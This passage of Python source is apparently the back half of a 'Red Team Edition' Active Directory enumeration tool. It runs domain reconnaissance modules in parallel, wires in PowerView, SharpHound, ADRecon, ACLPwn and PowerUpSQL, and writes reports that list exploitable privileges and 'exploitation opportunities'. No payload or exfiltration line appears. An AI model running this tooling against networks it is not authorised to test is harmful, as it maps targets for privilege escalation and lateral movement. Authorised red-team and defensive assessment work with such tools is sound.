        """Parse net command output to extract items"""
        lines = output.split('\n')
        items = []
        for line in lines:
            line = line.strip()
            if line and not line.startswith('-') and not line.startswith('The command') and not line.startswith('User accounts'):
                items.extend([item.strip() for item in line.split() if item.strip()])
        return [item for item in items if len(item) > 2 and not item.startswith('\\\\')]
    
    def worker(self, task, worker_id):
        """Worker thread function"""
        try:
            self.logger.log(f"Starting task: {task.name}", status="INFO", thread_id=worker_id)
            result = task.execute(thread_id=worker_id)
            self.logger.log(f"Completed task: {task.name}", status="SUCCESS", thread_id=worker_id)
            return result
        except Exception as e:
            self.logger.log(f"Task failed: {task.name}", error=str(e), status="ERROR", thread_id=worker_id)
            return None
    
    def run_enumeration_parallel(self):
        """Execute enumeration tasks in parallel"""
        # Define all enumeration tasks
        tasks = [
            EnumerationTask("Current User", self.enumerate_current_user, priority=1, enabled=True),
            EnumerationTask("Local System", self.enumerate_local_system, priority=1, enabled=True),
            EnumerationTask("Domain Basic", self.enumerate_domain_basic, priority=1, enabled=True),
            EnumerationTask("Shares", self.enumerate_shares, priority=2, enabled=True),
            EnumerationTask("GPO", self.enumerate_gpo, priority=2, enabled=True),
            EnumerationTask("PowerView", self.enumerate_powerview, priority=3, enabled=self.config.powerview),
            EnumerationTask("SharpHound", self.enumerate_sharphound, priority=3, enabled=self.config.sharphound),
            EnumerationTask("ADRecon", self.enumerate_adrecon, priority=3, enabled=self.config.adrecon),
            EnumerationTask("ACLPwn", self.enumerate_aclpwn, priority=4, enabled=self.config.aclpwn),
            EnumerationTask("PowerUpSQL", self.enumerate_powerupsql, priority=4, enabled=self.config.powerupsql),
        ]
        
        # Filter enabled tasks
        enabled_tasks = [task for task in tasks if task.enabled]
        
        self.logger.log(f"Starting parallel enumeration with {len(enabled_tasks)} tasks", status="INFO")
        
        # Execute tasks in parallel with thread pool
        max_workers = min(self.config.threads, len(enabled_tasks))
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_task = {
                executor.submit(self.worker, task, f"W{i}"): task 
                for i, task in enumerate(enabled_tasks, 1)
            }
            
            for future in as_completed(future_to_task):
                task = future_to_task[future]
                try:
                    result = future.result()
                except Exception as e:
                    self.logger.log(f"Task exception: {task.name}", error=str(e), status="ERROR")
        
        # Run analysis after all enumeration is complete
        self.logger.log("All enumeration tasks completed, running analysis", status="INFO")
        self.analyze_weaknesses()
    
    def generate_ascii_diagram(self):
        """Generate enhanced ASCII diagram of domain structure"""
        diagram = []
        w = 100  # Width
        
        diagram.append("=" * w)
        diagram.append("                                 DOMAIN TOPOLOGY DIAGRAM".center(w))
        diagram.append("=" * w)
        diagram.append("")
        
        # Extract domain name
        domain_name = "DOMAIN.LOCAL"
        try:
            domain_info = json.loads(self.results['domain_info'].get('basic', '{}'))
            if isinstance(domain_info, dict) and 'Name' in domain_info:
                domain_name = domain_info['Name']
        except:
            pass
        
        # Domain root
        diagram.append(f"                                   [{domain_name}]".center(w))
        diagram.append("                                        |".center(w))
        diagram.append("               +------------------------+------------------------+".center(w))
        diagram.append("               |                        |                        |".center(w))
        diagram.append("        [Domain Controllers]      [User Objects]         [Computer Objects]".center(w))
        diagram.append("")
        
        # Domain Controllers
        dcs = self.extract_domain_controllers()
        if dcs:
            diagram.append("    Domain Controllers:".ljust(w))
            for i, dc in enumerate(dcs[:5]):
                diagram.append(f"      [{i+1}] {dc['name']:<30} IP: {dc['ip']:<15}".ljust(w))
        
        diagram.append("")
        diagram.append("    Critical Groups & Membership:".ljust(w))
        diagram.append("    " + "-" * 80)
        
        # High-value groups
        key_groups = ['Domain Admins', 'Enterprise Admins', 'Administrators', 'Backup Operators']
        for group in key_groups:
            if group in str(self.results['groups']):
                diagram.append(f"      [+] {group}".ljust(w))
        
        diagram.append("")
        diagram.append("    Current User Privileges:".ljust(w))
        diagram.append("    " + "-" * 80)
        
        # Show if user is admin
        if self.results['local_privileges'].get('is_admin'):
            diagram.append("      [!!!] LOCAL ADMINISTRATOR ACCESS".ljust(w))
        
        # Show critical privileges
        privileges = str(self.results['current_user'].get('privileges', ''))
        critical_privs = ['SeDebugPrivilege', 'SeImpersonatePrivilege', 'SeLoadDriverPrivilege']
        for priv in critical_privs:
            if priv in privileges:
                diagram.append(f"      [!] {priv}".ljust(w))
        
        diagram.append("")
        diagram.append("    Attack Surface Summary:".ljust(w))
        diagram.append("    " + "-" * 80)
        diagram.append(f"      Users:     {len(self.results['users']):>6}".ljust(w))
        diagram.append(f"      Computers: {len(self.results['computers']):>6}".ljust(w))
        diagram.append(f"      Groups:    {len(self.results['groups']):>6}".ljust(w))
        diagram.append(f"      Shares:    {len(self.results['shares']):>6}".ljust(w))
        
        if self.results.get('sql_instances'):
            try:
                sql_data = json.loads(self.results['sql_instances'])
                if isinstance(sql_data, dict) and 'SQLInstances' in sql_data:
                    sql_count = len(json.loads(sql_data['SQLInstances']))
                    diagram.append(f"      SQL Instances: {sql_count:>6}".ljust(w))
            except:
                pass
        
        diagram.append("")
        diagram.append("    CRITICAL FINDINGS:".ljust(w))
        diagram.append("    " + "=" * 80)
        
        # Show top 5 critical findings
        critical_findings = [f for f in self.results['weaknesses'] if f['severity'] in ['CRITICAL', 'HIGH']]
        for i, finding in enumerate(critical_findings[:5], 1):
            severity_symbol = "!!!" if finding['severity'] == 'CRITICAL' else "!!"
            diagram.append(f"      [{severity_symbol}] {finding['finding']:<50} CVSS: {finding.get('cvss', 'N/A')}".ljust(w))
        
        if len(critical_findings) > 5:
            diagram.append(f"      ... and {len(critical_findings) - 5} more critical findings".ljust(w))
        
        diagram.append("")
        diagram.append("    Tool Integration Status:".ljust(w))
        diagram.append("    " + "-" * 80)
        diagram.append(f"      PowerView:   {'[COMPLETED]' if self.config.powerview else '[DISABLED]'}".ljust(w))
        diagram.append(f"      SharpHound:  {'[COMPLETED]' if self.config.sharphound else '[DISABLED]'}".ljust(w))
        diagram.append(f"      ADRecon:     {'[COMPLETED]' if self.config.adrecon else '[DISABLED]'}".ljust(w))
        diagram.append(f"      ACLPwn:      {'[COMPLETED]' if self.config.aclpwn else '[DISABLED]'}".ljust(w))
        diagram.append(f"      PowerUpSQL:  {'[COMPLETED]' if self.config.powerupsql else '[DISABLED]'}".ljust(w))
        
        diagram.append("")
        diagram.append("=" * w)
        
        return "\n".join(diagram)
    
    def extract_domain_controllers(self):
        """Extract DC information from results"""
        dcs = []
        dc_output = self.results['domain_info'].get('domain_controllers', '')
        
        # Parse DC list
        lines = dc_output.split('\n')
        for line in lines:
            if '\\\\' in line:
                parts = line.split()
                if len(parts) > 0:
                    dc_name = parts[0].replace('\\\\', '').strip()
                    dc_ip = '0.0.0.0'
                    # Try to extract IP if present
                    for part in parts:
                        if '.' in part and part.replace('.', '').isdigit():
                            dc_ip = part
                            break
                    dcs.append({'name': dc_name, 'ip': dc_ip})
        
        # Also try to parse from domain info JSON
        try:
            domain_info = json.loads(self.results['domain_info'].get('basic', '{}'))
            if isinstance(domain_info, dict) and 'DomainControllers' in domain_info:
                dc_list = domain_info['DomainControllers']
                if isinstance(dc_list, list):
                    for dc in dc_list:
                        if dc not in [d['name'] for d in dcs]:
                            dcs.append({'name': dc, 'ip': '0.0.0.0'})
        except:
            pass
        
        return dcs if dcs else [{'name': 'DC01', 'ip': '0.0.0.0'}]
    
    def generate_report(self, output_file="domain_enum_report.txt"):
        """Generate comprehensive text report"""
        self.logger.log("Generating final report", status="INFO")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            w = 100  # Width for formatting
            
            # Header
            f.write("=" * w + "\n")
            f.write("              DOMAIN ENUMERATION REPORT - RED TEAM PERSPECTIVE\n".center(w))
            f.write("=" * w + "\n")
            f.write(f"Generated:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Executed By:  {self.results['metadata']['username']}\n")
            f.write(f"Hostname:     {self.results['metadata']['hostname']}\n")
            f.write(f"Threads Used: {self.config.threads}\n")
            f.write("=" * w + "\n\n")
            
            # ASCII Diagram
            f.write(self.generate_ascii_diagram())
            f.write("\n\n")
            
            # Executive Summary
            f.write("=" * w + "\n")
            f.write("                             EXECUTIVE SUMMARY\n".center(w))
            f.write("=" * w + "\n")
            critical_count = len([f for f in self.results['weaknesses'] if f['severity'] == 'CRITICAL'])
            high_count = len([f for f in self.results['weaknesses'] if f['severity'] == 'HIGH'])
            medium_count = len([f for f in self.results['weaknesses'] if f['severity'] == 'MEDIUM'])
            
            f.write(f"\nRisk Assessment:\n")
            f.write(f"  Critical Issues:  {critical_count:>3}\n")
            f.write(f"  High Issues:      {high_count:>3}\n")
            f.write(f"  Medium Issues:    {medium_count:>3}\n")
            f.write(f"\nDiscovered Assets:\n")
            f.write(f"  Domain Users:     {len(self.results['users']):>6}\n")
            f.write(f"  Domain Computers: {len(self.results['computers']):>6}\n")
            f.write(f"  Domain Groups:    {len(self.results['groups']):>6}\n")
            f.write(f"  Network Shares:   {len(self.results['shares']):>6}\n")
            
            f.write("\n\n")
            
            # Current User Context
            f.write("=" * w + "\n")
            f.write("                          CURRENT USER CONTEXT\n".center(w))
            f.write("=" * w + "\n\n")
            f.write("WHO AM I:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['current_user'].get('whoami', 'N/A')))
            f.write("\n\n")
            
            f.write("PRIVILEGES:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['current_user'].get('privileges', 'N/A')))
            f.write("\n\n")
            
            f.write("GROUP MEMBERSHIPS:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['current_user'].get('groups', 'N/A')))
            f.write("\n\n")
            
            # Security Weaknesses - MOST IMPORTANT SECTION
            f.write("=" * w + "\n")
            f.write("          SECURITY WEAKNESSES & RED TEAM EXPLOITATION OPPORTUNITIES\n".center(w))
            f.write("=" * w + "\n\n")
            
            for i, finding in enumerate(self.results['weaknesses'], 1):
                f.write(f"\n[{i}] {finding['finding']}\n")
                f.write("=" * w + "\n")
                f.write(f"Severity:     {finding['severity']}\n")
                f.write(f"Category:     {finding['category']}\n")
                f.write(f"CVSS Score:   {finding.get('cvss', 'N/A')}\n")
                f.write(f"\nDescription:\n  {finding['description']}\n")
                f.write(f"\nExploitation:\n  {finding['recommendation']}\n")
                f.write("-" * w + "\n")
            
            f.write("\n\n")
            
            # Domain Information
            f.write("=" * w + "\n")
            f.write("                            DOMAIN INFORMATION\n".center(w))
            f.write("=" * w + "\n\n")
            f.write("BASIC DOMAIN INFO:\n")
            f.write("-" * w + "\n")
            try:
                domain_json = json.loads(self.results['domain_info'].get('basic', '{}'))
                f.write(json.dumps(domain_json, indent=2))
            except:
                f.write(str(self.results['domain_info'].get('basic', 'N/A')))
            f.write("\n\n")
            
            f.write("DOMAIN CONTROLLERS:\n")
            f.write("-" * w + "\n")
            f.write(str(self.results['domain_info'].get('domain_controllers', 'N/A')))
            f.write("\n\n")
            
            # Users (limited output)
            f.write("DOMAIN USERS (Sample):\n")
            f.write("-" * w + "\n")
            for user in self.results['users'][:100]:
                f.write(f"  - {user}\n")
            if len(self.results['users']) > 100:
                f.write(f"  ... and {len(self.results['users']) - 100} more users\n")
            f.write("\n\n")
            
            # Computers (limited output)
            f.write("DOMAIN COMPUTERS (Sample):\n")
            f.write("-" * w + "\n")
            for computer in self.results['computers'][:100]:
                f.write(f"  - {computer}\n")
            if len(self.results['computers']) > 100:
                f.write(f"  ... and {len(self.results['computers']) - 100} more computers\n")
            f.write("\n\n")
            
            # Groups
            f.write("DOMAIN GROUPS:\n")
            f.write("-" * w + "\n")
            for group in self.results['groups']:
                f.write(f"  - {group}\n")
            f.write("\n\n")
            
            # Network Shares
            f.write("NETWORK SHARES:\n")
            f.write("-" * w + "\n")
            for share in self.results['shares']:
                f.write(f"\n{share['type'].upper()} SHARES:\n")
                f.write(str(share['data'])[:2000] + "\n")
            f.write("\n\n")
            
            # GPO
            f.write("GROUP POLICY OBJECTS:\n")
            f.write("-" * w + "\n")
            for gpo in self.results['gpo']:
                f.write(f"\n{gpo.get('scope', 'unknown').upper()} SCOPE:\n")
                f.write(str(gpo.get('data', ''))[:2000] + "\n")
            f.write("\n\n")
            
            # PowerView Results
            if self.config.powerview and self.results.get('powerview_data'):
                f.write("=" * w + "\n")
                f.write("                          POWERVIEW ENUMERATION RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                try:
                    pv_data = json.loads(self.results['powerview_data'])
                    f.write(json.dumps(pv_data, indent=2)[:10000])
                except:
                    f.write(str(self.results['powerview_data'])[:10000])
                f.write("\n\n")
            
            # SharpHound Results
            if self.config.sharphound and self.results.get('bloodhound_data'):
                f.write("=" * w + "\n")
                f.write("                        SHARPHOUND/BLOODHOUND RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                bh_data = self.results['bloodhound_data']
                f.write(f"BloodHound ZIP File: {bh_data.get('zip_file', 'N/A')}\n")
                f.write(f"Location: {bh_data.get('path', 'N/A')}\n")
                f.write(f"\nOutput:\n{str(bh_data.get('output', 'N/A'))[:2000]}\n")
                f.write("\n\n")
            
            # ADRecon Results
            if self.config.adrecon and self.results.get('adrecon_data'):
                f.write("=" * w + "\n")
                f.write("ADRECON RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                ad_data = self.results['adrecon_data']
                f.write(f"Output Directory: {ad_data.get('output_dir', 'N/A')}\n")
                f.write(f"\nOutput:\n{str(ad_data.get('output', 'N/A'))[:2000]}\n")
                f.write("\n\n")
            
            # ACLPwn Results
            if self.config.aclpwn and self.results.get('aclpwn_data'):
                f.write("=" * w + "\n")
                f.write("                           ACLPWN RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                try:
                    acl_data = json.loads(self.results['aclpwn_data'])
                    f.write(json.dumps(acl_data, indent=2)[:5000])
                except:
                    f.write(str(self.results['aclpwn_data'])[:5000])
                f.write("\n\n")
            
            # PowerUpSQL Results
            if self.config.powerupsql and self.results.get('powerupsql_data'):
                f.write("=" * w + "\n")
                f.write("                         POWERUPSQL RESULTS\n".center(w))
                f.write("=" * w + "\n\n")
                try:
                    sql_data = json.loads(self.results['powerupsql_data'])
                    f.write(json.dumps(sql_data, indent=2)[:5000])
                except:
                    f.write(str(self.results['powerupsql_data'])[:5000])
                f.write("\n\n")
            
            # Cleanup Information
            f.write("=" * w + "\n")
            f.write("                           CLEANUP INFORMATION\n".center(w))
            f.write("=" * w + "\n\n")
            f.write(f"Temporary Directory: {self.temp_dir}\n")
            f.write("Please ensure this directory is properly cleaned up after analysis.\n\n")
            
            # Footer
            f.write("=" * w + "\n")
            f.write("                    END OF DOMAIN ENUMERATION REPORT\n".center(w))
            f.write("=" * w + "\n")
        
        self.logger.log(f"Report saved to: {output_file}", status="SUCCESS")
        return output_file

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Advanced Domain Enumeration Tool - Red Team Edition')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')
    parser.add_argument('--powerview', action='store_true', help='Enable PowerView enumeration')
    parser.add_argument('--sharphound', action='store_true', help='Enable SharpHound enumeration')
    parser.add_argument('--adrecon', action='store_true', help='Enable ADRecon enumeration')
    parser.add_argument('--aclpwn', action='store_true', help='Enable ACLPwn enumeration')
    parser.add_argument('--powerupsql', action='store_true', help='Enable PowerUpSQL enumeration')
    parser.add_argument('--all', action='store_true', help='Enable all enumeration modules')
    parser.add_argument('--output', type=str, default='domain_enum_report.txt', help='Output report filename')
    parser.add_argument('--in-memory', action='store_true', dest='in_memory_mode', 
                        help='Run tools from memory without downloading')
    parser.add_argument('--no-cleanup', action='store_true', help='Do not cleanup temporary files')
    
    args = parser.parse_args()
    
    # If --all flag is set, enable all modules
    if args.all:
        args.powerview = True
        args.sharphound = True
        args.adrecon = True
        args.aclpwn = True
        args.powerupsql = True
    
    start_time = datetime.now()
    print(f"[+] Starting Advanced Domain Enumeration at {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[+] Configuration:")
    print(f"    Threads: {args.threads}")
    print(f"    PowerView: {'ENABLED' if args.powerview else 'DISABLED'}")
    print(f"    SharpHound: {'ENABLED' if args.sharphound else 'DISABLED'}")
    print(f"    ADRecon: {'ENABLED' if args.adrecon else 'DISABLED'}")
    print(f"    ACLPwn: {'ENABLED' if args.aclpwn else 'DISABLED'}")
    print(f"    PowerUpSQL: {'ENABLED' if args.powerupsql else 'DISABLED'}")
    print(f"    In-Memory Mode: {'ENABLED' if args.in_memory_mode else 'DISABLED'}")
    
    try:
        # Initialize enumerator
        enumerator = DomainEnumerator(args)
        
        # Run enumeration
        enumerator.run_enumeration_parallel()
        
        # Generate report
        report_file = enumerator.generate_report(args.output)
        end_time = datetime.now()
        duration = end_time - start_time
        
        print(f"\n[+] Enumeration completed successfully!")
        print(f"[+] Report saved to: {report_file}")
        print(f"[+] Execution time: {duration}")
        print(f"[+] Start time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[+] End time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Cleanup
        if not args.no_cleanup and not args.in_memory_mode:
            try:
                shutil.rmtree(enumerator.temp_dir)
                print(f"[+] Temporary directory cleaned up: {enumerator.temp_dir}")
            except Exception as e:
                print(f"[-] Warning: Could not clean up temporary directory: {e}")
        
        # Display quick summary
        critical_findings = [f for f in enumerator.results['weaknesses'] if f['severity'] == 'CRITICAL']
        high_findings = [f for f in enumerator.results['weaknesses'] if f['severity'] == 'HIGH']
        
        if critical_findings or high_findings:
            print(f"\n[!] SECURITY FINDINGS SUMMARY:")
            if critical_findings:
                print(f"    CRITICAL: {len(critical_findings)} issue(s) requiring immediate attention")
            if high_findings:
                print(f"    HIGH:     {len(high_findings)} significant security issues")
            print(f"    See full report for detailed exploitation recommendations.")
        else:
            print(f"\n[+] No critical or high severity issues found during enumeration.")
            
    except KeyboardInterrupt:
        print(f"\n[-] Enumeration interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error during enumeration: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
